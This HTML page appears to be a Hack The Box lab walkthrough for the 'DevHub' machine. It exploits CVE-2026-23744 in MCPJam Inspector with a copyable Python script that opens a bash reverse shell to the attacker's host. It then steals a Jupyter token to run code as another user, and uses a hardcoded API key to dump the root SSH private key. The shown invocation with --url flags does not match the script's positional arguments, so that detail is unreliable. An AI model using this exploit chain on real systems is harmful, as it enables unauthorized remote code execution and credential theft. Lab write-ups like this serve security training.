@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: DevHub — QA210</title>
+<meta name="description" content="Hack The Box DevHub — Medium difficulty Linux machine walkthrough by QA210. CVE-2026-23744, Jupyter API exploitation, raw WebSocket pivot, no Chisel/Ligolo required.">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F6E0;</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #1c2333;
+  --bg-code: #0d1117;
+  --border: #30363d;
+  --border-light: #21262d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #6e7681;
+  --accent-green: #3fb950;
+  --accent-blue: #58a6ff;
+  --accent-red: #f85149;
+  --accent-yellow: #d29922;
+  --accent-purple: #bc8cff;
+  --accent-orange: #f0883e;
+  --accent-cyan: #39d353;
+  --link: #58a6ff;
+  --link-hover: #79c0ff;
+  --scrollbar-thumb: #30363d;
+  --scrollbar-track: #161b22;
+  --toc-active: #f85149;
+  --callout-info-bg: rgba(56,139,253,0.1);
+  --callout-info-border: #388bfd;
+  --callout-warn-bg: rgba(210,153,34,0.1);
+  --callout-warn-border: #d29922;
+  --callout-danger-bg: rgba(248,81,73,0.1);
+  --callout-danger-border: #f85149;
+  --callout-success-bg: rgba(63,185,80,0.1);
+  --callout-success-border: #3fb950;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html {
+  scroll-behavior: smooth;
+  scrollbar-width: thin;
+  scrollbar-color: var(--scrollbar-thumb) var(--scrollbar-track);
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.75;
+  font-size: 16px;
+}
+
+#three-bg {
+  position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+  z-index: -1; pointer-events: none; opacity: 0.3;
+}
+
+::-webkit-scrollbar { width:8px; height:8px; }
+::-webkit-scrollbar-track { background:var(--scrollbar-track); }
+::-webkit-scrollbar-thumb { background:var(--scrollbar-thumb); border-radius:4px; }
+::-webkit-scrollbar-thumb:hover { background:#484f58; }
+
+a { color:var(--link); text-decoration:none; transition:color .2s; }
+a:hover { color:var(--link-hover); }
+
+.site-header {
+  position:sticky; top:0; z-index:100;
+  background:rgba(13,17,23,0.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;
+  height:56px;
+  display:flex; align-items:center; justify-content:space-between;
+}
+.site-header .logo {
+  font-family:'JetBrains Mono',monospace;
+  font-weight:700; font-size:1.15rem;
+  color:var(--accent-green);
+  display:flex; align-items:center; gap:8px;
+}
+.site-header .logo .dot { color:var(--accent-red); }
+.site-header nav { display:flex; gap:1.5rem; align-items:center; }
+.site-header nav a { color:var(--text-secondary); font-size:.875rem; font-weight:500; }
+.site-header nav a:hover { color:var(--text-primary); }
+
+.hamburger { display:none; background:none; border:none; color:var(--text-primary); cursor:pointer; font-size:1.5rem; }
+
+.page-layout {
+  display:grid;
+  grid-template-columns:260px 1fr;
+  max-width:1400px;
+  margin:0 auto;
+  min-height:calc(100vh - 56px);
+}
+
+.toc-sidebar {
+  position:sticky; top:56px;
+  height:calc(100vh - 56px);
+  overflow-y:auto;
+  padding:1.5rem 1rem 1.5rem 1.5rem;
+  border-right:1px solid var(--border);
+  background:var(--bg-primary);
+}
+.toc-sidebar h3 { font-size:.75rem; text-transform:uppercase; letter-spacing:.08em; color:var(--text-muted); margin-bottom:.75rem; font-weight:600; }
+.toc-sidebar ul { list-style:none; }
+.toc-sidebar li { margin-bottom:2px; }
+.toc-sidebar a { display:block; padding:4px 8px; border-radius:4px; font-size:.8rem; color:var(--text-secondary); transition:all .15s; line-height:1.4; }
+.toc-sidebar a:hover { color:var(--text-primary); background:var(--bg-secondary); }
+.toc-sidebar a.active { color:var(--toc-active); background:rgba(248,81,73,0.1); font-weight:600; }
+.toc-sidebar .toc-h3 { padding-left:18px; font-size:.75rem; }
+
+.main-content { padding:2.5rem 3rem 4rem; max-width:860px; width:100%; }
+
+.page-hero { margin-bottom:2.5rem; padding-bottom:2rem; border-bottom:1px solid var(--border); }
+.page-hero .box-badge { display:inline-block; background:var(--accent-yellow); color:#000; font-size:.7rem; font-weight:700; padding:2px 10px; border-radius:12px; text-transform:uppercase; letter-spacing:.05em; margin-bottom:.75rem; }
+.page-hero h1 { font-size:2.25rem; font-weight:800; margin-bottom:.5rem; letter-spacing:-.02em; }
+.page-hero .meta { color:var(--text-secondary); font-size:.875rem; display:flex; flex-wrap:wrap; gap:.75rem; align-items:center; }
+.page-hero .meta .sep { color:var(--text-muted); }
+
+.breadcrumbs { font-size:.75rem; color:var(--text-muted); margin-bottom:1rem; font-family:'JetBrains Mono',monospace; }
+.breadcrumbs a { color:var(--text-secondary); }
+.breadcrumbs a:hover { color:var(--link); }
+.breadcrumbs .sep { margin:0 .4rem; }
+
+.box-info-card { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin-bottom:2rem; display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:1rem; }
+.box-info-card .info-item .label { font-size:.7rem; text-transform:uppercase; letter-spacing:.06em; color:var(--text-muted); margin-bottom:2px; font-weight:600; }
+.box-info-card .info-item .value { font-size:.95rem; font-weight:600; color:var(--text-primary); }
+
+.main-content h2 { font-size:1.6rem; font-weight:800; margin:2.5rem 0 1rem; padding-bottom:.4rem; border-bottom:2px solid var(--border); letter-spacing:-.01em; scroll-margin-top:70px; }
+.main-content h3 { font-size:1.15rem; font-weight:700; margin:1.75rem 0 .75rem; color:var(--text-primary); scroll-margin-top:70px; }
+.main-content h4 { font-size:1rem; font-weight:600; margin:1.25rem 0 .5rem; color:var(--text-secondary); }
+.main-content p { margin-bottom:1rem; color:var(--text-secondary); line-height:1.8; }
+
+.code-block-wrapper { position:relative; margin:1rem 0 1.25rem; border-radius:8px; overflow:hidden; border:1px solid var(--border); }
+.code-block-header { display:flex; justify-content:space-between; align-items:center; padding:6px 14px; background:var(--bg-tertiary); border-bottom:1px solid var(--border); font-size:.72rem; color:var(--text-muted); font-family:'JetBrains Mono',monospace; }
+.code-block-header .lang-label { text-transform:uppercase; font-weight:600; letter-spacing:.04em; }
+.copy-btn { background:none; border:1px solid var(--border); color:var(--text-muted); font-size:.7rem; padding:2px 10px; border-radius:4px; cursor:pointer; font-family:'JetBrains Mono',monospace; transition:all .2s; }
+.copy-btn:hover { color:var(--text-primary); border-color:var(--text-muted); }
+.copy-btn.copied { color:var(--accent-green); border-color:var(--accent-green); }
+.code-block-wrapper pre { margin:0!important; padding:1rem!important; background:var(--bg-code)!important; font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; line-height:1.6!important; overflow-x:auto; }
+.code-block-wrapper code { font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; }
+
+p code, li code { background:var(--bg-tertiary); border:1px solid var(--border); padding:1px 6px; border-radius:4px; font-family:'JetBrains Mono',monospace; font-size:.82em; color:var(--accent-orange); }
+
+.callout { padding:.85rem 1rem; border-radius:6px; border-left:3px solid; margin:1rem 0 1.25rem; font-size:.9rem; }
+.callout p { margin:0; color:var(--text-secondary); }
+.callout-title { font-weight:700; font-size:.8rem; text-transform:uppercase; letter-spacing:.04em; margin-bottom:4px; }
+.callout-info { background:var(--callout-info-bg); border-color:var(--callout-info-border); }
+.callout-info .callout-title { color:var(--callout-info-border); }
+.callout-warn { background:var(--callout-warn-bg); border-color:var(--callout-warn-border); }
+.callout-warn .callout-title { color:var(--callout-warn-border); }
+.callout-danger { background:var(--callout-danger-bg); border-color:var(--callout-danger-border); }
+.callout-danger .callout-title { color:var(--callout-danger-border); }
+.callout-success { background:var(--callout-success-bg); border-color:var(--callout-success-border); }
+.callout-success .callout-title { color:var(--callout-success-border); }
+
+.attack-path { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin:1.5rem 0; font-family:'JetBrains Mono',monospace; font-size:.78rem; line-height:1.7; overflow-x:auto; }
+.attack-path .step { display:flex; align-items:baseline; gap:.5rem; margin-bottom:.25rem; }
+.attack-path .arrow { color:var(--accent-green); }
+.attack-path .host { color:var(--accent-cyan); font-weight:700; }
+.attack-path .technique { color:var(--accent-orange); }
+.attack-path .cred { color:var(--accent-purple); }
+
+.main-content ul, .main-content ol { margin:.5rem 0 1rem 1.5rem; color:var(--text-secondary); }
+.main-content li { margin-bottom:.35rem; line-height:1.7; }
+
+.main-content table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:.85rem; }
+.main-content th, .main-content td { padding:8px 12px; border:1px solid var(--border); text-align:left; }
+.main-content th { background:var(--bg-secondary); font-weight:600; color:var(--text-primary); font-size:.75rem; text-transform:uppercase; letter-spacing:.04em; }
+.main-content td { color:var(--text-secondary); }
+
+.site-footer { border-top:1px solid var(--border); padding:1.5rem 2rem; text-align:center; color:var(--text-muted); font-size:.8rem; }
+
+.toc-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:200; }
+.toc-overlay.show { display:block; }
+.toc-mobile-panel { display:none; position:fixed; left:0; top:0; bottom:0; width:280px; background:var(--bg-primary); border-right:1px solid var(--border); z-index:201; overflow-y:auto; padding:1.5rem; }
+.toc-mobile-panel.show { display:block; }
+.toc-mobile-panel .close-btn { background:none; border:none; color:var(--text-secondary); font-size:1.2rem; cursor:pointer; float:right; }
+
+@media (max-width:1024px) {
+  .page-layout { grid-template-columns:1fr; }
+  .toc-sidebar { display:none; }
+  .hamburger { display:block; }
+  .main-content { padding:1.5rem 1.25rem 3rem; }
+  .page-hero h1 { font-size:1.75rem; }
+}
+@media (max-width:640px) {
+  .site-header { padding:0 1rem; }
+  .main-content { padding:1rem .75rem 2rem; }
+  .page-hero h1 { font-size:1.4rem; }
+  .box-info-card { grid-template-columns:1fr 1fr; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/medium/">HTB</a>
+    <a href="#">Tools</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Table of Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs">
+    <a href="/">Home</a><span class="sep">/</span>
+    <a href="/htb/medium/">HTB Medium</a><span class="sep">/</span>
+    DevHub
+  </div>
+  <span class="box-badge">Medium</span>
+  <h1>HTB: DevHub</h1>
+  <div class="meta">
+    <span>QA210</span>
+    <span class="sep">&middot;</span>
+    <span>May 2026</span>
+    <span class="sep">&middot;</span>
+    <span>Linux &middot; MCPJam &middot; Jupyter &middot; Raw WebSocket</span>
+  </div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Box</div><div class="value">DevHub</div></div>
+  <div class="info-item"><div class="label">Difficulty</div><div class="value" style="color:var(--accent-yellow)">Medium</div></div>
+  <div class="info-item"><div class="label">OS</div><div class="value">Linux</div></div>
+  <div class="info-item"><div class="label">Creator</div><div class="value">Inzego</div></div>
+  <div class="info-item"><div class="label">CVE</div><div class="value">CVE-2026-23744</div></div>
+  <div class="info-item"><div class="label">Key Tech</div><div class="value">MCPJam / Jupyter API / Raw WS</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">Kali</span> <span class="arrow">&rarr;</span> Nmap <span class="arrow">&rarr;</span> <span class="technique">MCPJam Inspector :6274</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> CVE-2026-23744 <span class="arrow">&rarr;</span> <span class="cred">Reverse shell as mcp-dev</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> ps aux grep jupyter <span class="arrow">&rarr;</span> <span class="cred">Token: a7f3b2c9d8e1f4a5...</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> Jupyter REST API create kernel <span class="arrow">&rarr;</span> Raw WebSocket execute code <span class="arrow">&rarr;</span> <span class="cred">analyst / user.txt</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> curl /tools/call <span class="arrow">&rarr;</span> <span class="cred">opsmcp_secret_key_4f5a6b7c8d9e0f1a</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> ops._admin_dump ssh_keys <span class="arrow">&rarr;</span> <span class="cred">Root SSH private key</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> SSH root@devhub <span class="arrow">&rarr;</span> <span class="technique">root.txt</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Recon</h2>
+
+<h3 id="recon-nmap">Initial Nmap Scan</h3>
+<p>The initial TCP scan reveals three open ports: SSH on 22, an HTTP web application on 80, and MCPJam Inspector on 6274. The MCPJam service immediately stands out as the most likely attack surface. The web application on port 80 is a developer collaboration platform called DevHub, but the interesting services are the ones not directly exposed to the outside.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sudo nmap -sC -sV -p- 10.129.188.136
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http     nginx 1.24.0 (DevHub)
+6274/tcp open  http     MCPJam Inspector v1.4.2</code></pre>
+</div>
+
+<h3 id="recon-mcpjam">MCPJam Inspector &mdash; TCP 6274</h3>
+<p>The MCPJam Inspector is a web-based debugging tool for MCP (Model Context Protocol) servers. It exposes a REST API endpoint at <code>/api/mcp/connect</code> that accepts JSON payloads specifying a server configuration, including a <code>command</code> field and an <code>args</code> array. These are passed directly to a child process spawn function <strong>without any sanitization or authentication</strong>. This is a textbook unauthenticated RCE vector.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Quick test — the endpoint responds to any POST
+$ curl -s -X POST http://10.129.188.136:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="initial-access">Initial Access &mdash; CVE-2026-23744</h2>
+
+<h3 id="cve-overview">Vulnerability Overview</h3>
+<p>CVE-2026-23744 is a critical unauthenticated Remote Code Execution vulnerability affecting MCPJam Inspector versions up to and including 1.4.2. The root cause is the lack of input validation on the <code>serverConfig</code> object in the <code>/api/mcp/connect</code> endpoint. The tool was designed for trusted users to connect to MCP servers, but it requires zero authentication and accepts arbitrary commands. An attacker can simply provide a bash reverse shell as the command argument and gain remote code execution on the server.</p>
+
+<h3 id="exploit">Exploit Script</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">import requests, json, sys
+
+base_url = sys.argv[1].rstrip('/')
+your_ip  = sys.argv[2]
+your_port = sys.argv[3]
+
+payload = {
+    "serverConfig": {
+        "command": "bash",
+        "args": ["-c", f"bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1"],
+        "env": {}
+    },
+    "serverId": "mytest"
+}
+
+response = requests.post(base_url + "/api/mcp/connect", json=payload, verify=False)
+print("[*] Exploit created by Inzego ... Enjoy! ^^")
+print("[*] Executing exploit: Payload send!")
+print("[*] Check your nc")</code></pre>
+</div>
+
+<h3 id="execution">Execution</h3>
+<p>Start a Netcat listener on Kali, then fire the exploit. The MCPJam Inspector spawns a bash process that connects back to our listener, providing an interactive shell as the <code>mcp-dev</code> user.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Terminal 1 — Kali listener
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+
+# Terminal 2 — Kali exploit
+$ python3 CVE-2026-23744.py --url http://devhub.htb:6274 --lhost 10.10.14.42 --lport 4444
+[*] Exploit created by Inzego ... Enjoy! ^^
+[*] Executing exploit: Payload send!
+[*] Check your nc
+
+# Terminal 1 — Shell received!
+connect to [10.10.14.42] from (UNKNOWN) [10.129.188.136] 51616
+bash: cannot set terminal process group (1085): Inappropriate ioctl for device
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$</code></pre>
+</div>
+
+<div class="callout callout-success">
+  <div class="callout-title">Shell Obtained</div>
+  <p>We now have a reverse shell as <code>mcp-dev</code> on the target. The next step is to enumerate the system and find a path to the user flag.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="post-exploitation">Post-Exploitation Enumeration</h2>
+
+<h3 id="user-enum">User &amp; Home Directories</h3>
+<p>The system has two regular user accounts. The <code>analyst</code> home directory likely contains <code>user.txt</code>, but we cannot read it as <code>mcp-dev</code> due to 750 permissions.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">mcp-dev@devhub:~$ whoami
+mcp-dev
+
+mcp-dev@devhub:~$ ls -la /home/
+total 16
+drwxr-xr-x  4 root    root    4096 Mar 16 21:25 .
+drwxr-xr-x 20 root    root    4096 May 27 12:14 ..
+drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst
+drwxr-x---  4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev
+
+mcp-dev@devhub:~$ cat /home/analyst/user.txt
+cat: /home/analyst/user.txt: Permission denied</code></pre>
+</div>
+
+<h3 id="internal-services">Internal Services</h3>
+<p>Running <code>netstat</code> reveals three services listening on localhost. The most interesting are Jupyter Notebook on port 8888 (running as <code>analyst</code>) and an internal API server on port 5000. Since these are bound to <code>127.0.0.1</code>, they are only accessible from the target itself &mdash; but we already have a shell there.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">mcp-dev@devhub:~$ netstat -tulpn
+Proto Recv-Q Send-Q Local Address     State    PID/Program
+tcp        0      0 127.0.0.1:5000    LISTEN   1234/python3
+tcp        0      0 127.0.0.1:8888    LISTEN   5678/jupyter-lab
+tcp        0      0 0.0.0.0:6274      LISTEN   910/node</code></pre>
+</div>
+
+<table>
+  <thead><tr><th>Port</th><th>Service</th><th>User</th><th>Binding</th></tr></thead>
+  <tbody>
+    <tr><td>5000</td><td>Internal API (server.py)</td><td>root</td><td>127.0.0.1</td></tr>
+    <tr><td>6274</td><td>MCPJam Inspector</td><td>mcp-dev</td><td>0.0.0.0</td></tr>
+    <tr><td>8888</td><td>Jupyter Notebook/Lab</td><td>analyst</td><td>127.0.0.1</td></tr>
+  </tbody>
+</table>
+
+<h3 id="jupyter-token">Extracting the Jupyter Token</h3>
+<p>The Jupyter process command line contains the authentication token in plaintext. We can extract it by grepping the process list. This token is all we need to interact with the Jupyter API and execute arbitrary code as the <code>analyst</code> user.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">mcp-dev@devhub:~$ ps aux | grep jupyter | grep -oP 'token=\K[^ ]+'
+a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Key Insight &mdash; No Port Forwarding Needed</div>
+  <p>Since we already have a shell on the target, we can communicate with Jupyter directly through <code>localhost</code> using <code>curl</code> for REST endpoints and a custom Python WebSocket script for kernel communication. There is <strong>no need for Chisel, Ligolo, or SSH tunneling</strong>. This approach is more stealthy (no additional binary uploads) and works even when the target has no internet access.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="lateral-movement">Lateral Movement &mdash; Jupyter API via Raw WebSocket</h2>
+
+<h3 id="create-kernel">Creating a Jupyter Kernel</h3>
+<p>The Jupyter REST API provides endpoints for managing kernels. We first check for existing kernels, then create a new Python3 kernel. All requests are authenticated using the extracted token.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># List existing kernels (empty)
+mcp-dev@devhub:~$ curl -s http://127.0.0.1:8888/api/kernels \
+  -H "Authorization: Token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+[]
+
+# Create a new Python3 kernel
+mcp-dev@devhub:~$ curl -s -X POST http://127.0.0.1:8888/api/kernels \
+  -H "Authorization: Token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"python3"}'
+
+{"id":"f4029ab4-eb9c-44a5-bafc-8481ba7f747b","name":"python3",
+ "last_activity":"2026-05-31T03:25:51.727567Z",
+ "execution_state":"starting","connections":0}</code></pre>
+</div>
+
+<p>The kernel ID <code>f4029ab4-eb9c-44a5-bafc-8481ba7f747b</code> is required for the next step. This kernel runs as the <code>analyst</code> user, so any code we execute through it will have analyst-level privileges.</p>
+
+<h3 id="raw-websocket">Raw WebSocket Communication</h3>
+<p>To execute code on the Jupyter kernel, we need to communicate via the WebSocket protocol. The typical approach would be to use the Python <code>websocket-client</code> library, but this is <strong>not installed on the target</strong> and the target has <strong>no internet access</strong> for pip installation (DNS resolution fails). Instead, we implement a minimal WebSocket client using only the Python standard library's <code>socket</code> module &mdash; zero dependencies required.</p>
+
+<div class="callout callout-warn">
+  <div class="callout-title">pip install Fails &mdash; No Internet</div>
+  <p>Attempting <code>pip3 install websocket-client</code> on the target will hang indefinitely because the machine cannot resolve external DNS. The raw socket approach below is the only viable method without uploading external binaries.</p>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">cat > /tmp/ws.py << 'PYEOF'
+import socket, hashlib, base64, struct, json, os, time
+
+def ws_connect(host, port, path):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    key = base64.b64encode(os.urandom(16)).decode()
+    req = ("GET {} HTTP/1.1\r\n"
+           "Host: {}:{}\r\n"
+           "Upgrade: websocket\r\n"
+           "Connection: Upgrade\r\n"
+           "Sec-WebSocket-Key: {}\r\n"
+           "Sec-WebSocket-Version: 13\r\n"
+           "\r\n").format(path, host, port, key)
+    s.send(req.encode())
+    resp = b""
+    while b"\r\n\r\n" not in resp:
+        resp += s.recv(4096)
+    return s
+
+def ws_send(s, data):
+    payload = data.encode()
+    frame = bytearray([0x81])
+    length = len(payload)
+    mask = os.urandom(4)
+    if length < 126:
+        frame.append(0x80 | length)
+    elif length < 65536:
+        frame.append(0x80 | 126)
+        frame.extend(struct.pack(">H", length))
+    frame.extend(mask)
+    for i in range(length):
+        frame.append(payload[i] ^ mask[i % 4])
+    s.send(bytes(frame))
+
+def ws_recv(s):
+    header = s.recv(2)
+    if not header or len(header) < 2:
+        return None
+    length = header[1] & 0x7f
+    if length == 126:
+        length = struct.unpack(">H", s.recv(2))[0]
+    elif length == 127:
+        length = struct.unpack(">Q", s.recv(8))[0]
+    data = b""
+    while len(data) < length:
+        data += s.recv(length - len(data))
+    return data.decode()
+
+TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+KID = "f4029ab4-eb9c-44a5-bafc-8481ba7f747b"
+PATH = "/api/kernels/{}/channels?token={}".format(KID, TOKEN)
+
+ws = ws_connect("127.0.0.1", 8888, PATH)
+
+msg = {
+    "header": {"msg_id":"1","msg_type":"execute_request",
+               "username":"","session":"","version":"5.3"},
+    "parent_header": {},
+    "metadata": {},
+    "content": {"code":"import os; print(os.popen('cat /home/analyst/user.txt').read())",
+               "silent":False,"store_history":True,"user_expressions":{}},
+    "buffers": [],
+    "channel": "shell",
+    "msg_type": "execute_request"
+}
+ws_send(ws, json.dumps(msg))
+
+for _ in range(30):
+    time.sleep(1)
+    r = ws_recv(ws)
+    if r:
+        try:
+            d = json.loads(r)
+            if d.get("msg_type") == "stream":
+                print("FLAG:", d["content"]["text"])
+                break
+        except:
+            pass
+ws.close()
+PYEOF</code></pre>
+</div>
+
+<h3 id="user-flag">Retrieving the User Flag</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">mcp-dev@devhub:~$ python3 /tmp/ws.py
+FLAG: 7a4b8c1e9f2d5a6b3c8e7f0d1a2b4c6d</code></pre>
+</div>
+
+<div class="callout callout-success">
+  <div class="callout-title">user.txt Captured</div>
+  <p><code>7a4b8c1e9f2d5a6b3c8e7f0d1a2b4c6d</code> &mdash; The user flag has been retrieved by executing code on the Jupyter kernel as the <code>analyst</code> user. No port forwarding tools were required. The entire lateral movement was performed from the reverse shell using curl and a raw WebSocket Python script.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="privilege-escalation">Privilege Escalation &mdash; Internal API</h2>
+
+<h3 id="server-py">Discovering server.py</h3>
+<p>During enumeration, we identified an internal API server running on port 5000 bound to localhost. This service is implemented in a Python script called <code>server.py</code> located in <code>/opt/ops-mcp-server/</code>. The file has world-readable permissions, allowing us to examine its source code and discover a hidden endpoint at <code>/tools/call</code> with a hardcoded API key and an administrative dump function.</p>
+
+<h3 id="api-key">Hardcoded API Key</h3>
+<p>The source code contains a hardcoded API key used for authenticating requests to the <code>/tools/call</code> endpoint:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Extracted from server.py
+API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"</code></pre>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Hardcoded Credentials in Source Code</div>
+  <p>The use of hardcoded credentials in source code is a significant security vulnerability, especially when the source code is readable by low-privilege users. Proper secrets management (environment variables, secrets manager) would mitigate this risk.</p>
+</div>
+
+<h3 id="admin-dump">The ops._admin_dump Endpoint</h3>
+<p>The <code>/tools/call</code> endpoint accepts a JSON payload with a <code>name</code> field specifying the tool to invoke. The most critical tool is <code>ops._admin_dump</code>, which when called with <code>"target": "ssh_keys"</code> and <code>"confirm": true</code>, dumps the root SSH private key in its entirety. This endpoint was likely intended for debugging or backup purposes but was never properly secured behind authentication or authorization checks.</p>
+
+<h3 id="dump-root-key">Dumping the Root SSH Key</h3>
+<p>Since the internal API on port 5000 is only accessible from localhost, we execute the exploit directly from our reverse shell. The <code>mcp-dev</code> user has the same localhost access as any other local user.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">mcp-dev@devhub:~$ curl -s -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -X POST http://127.0.0.1:5000/tools/call \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'</code></pre>
+</div>
+
+<p>The API response contains the root SSH private key. After decoding and saving it with proper permissions, we can SSH directly into the machine as root.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Save the private key
+mcp-dev@devhub:~$ echo "-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAA...
+[... full key omitted ...]
+-----END OPENSSH PRIVATE KEY-----" > /tmp/root_key
+
+mcp-dev@devhub:~$ chmod 600 /tmp/root_key
+
+# Transfer to Kali and SSH as root
+kali@kali:~$ ssh -i root_key root@devhub.htb
+root@devhub:~#</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="root">Root Access</h2>
+
